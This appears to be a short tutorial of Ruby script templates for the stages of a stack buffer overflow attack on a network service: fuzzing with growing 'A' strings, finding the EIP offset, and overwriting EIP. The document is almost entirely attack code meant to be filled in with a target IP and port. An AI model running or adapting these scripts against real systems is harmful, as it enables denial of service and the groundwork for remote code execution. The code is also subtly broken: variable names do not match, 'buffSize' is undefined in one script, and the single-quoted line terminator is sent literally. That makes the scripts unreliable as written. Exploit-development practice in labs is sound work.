
### Ruby Templates for BOF

There are different stages of BOF and we'll have different scripts for each stage:

### Spiking & Fuzzing
```Ruby
require 'socket'

buff = "A" * 100
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

begin
    while true
        s = TCPSocket.open(RHOST, RPORT)
        s.puts buff + '\r\n'
        s.close
        sleep 1
        buffSize = buff.size
        buff += "A" * 100
    end
rescue Interrupt
    puts "Debugger crashed at #{buffSize} bytes"
end
```
### Finding Offset
```Ruby
require 'socket'

buffer = #Based on at what bytes you get to EIP, generate your pattern and insert it here, example "AAAA"
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

begin
    s = TCPSocket.open(RHOST, RPORT)
    s.puts buff + '\r\n'
    s.close
rescue Interrupt
    puts "Debugger crashed at #{buffSize} bytes"
end
```    
### Overwriting EIP
```Ruby
buffer = #Based on the offset bytes, place your pattern here 
buffer += "B" * 4
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

require 'socket'

TCPSocket.open(RHOST,RPORT){ |s| s.puts buff}
```
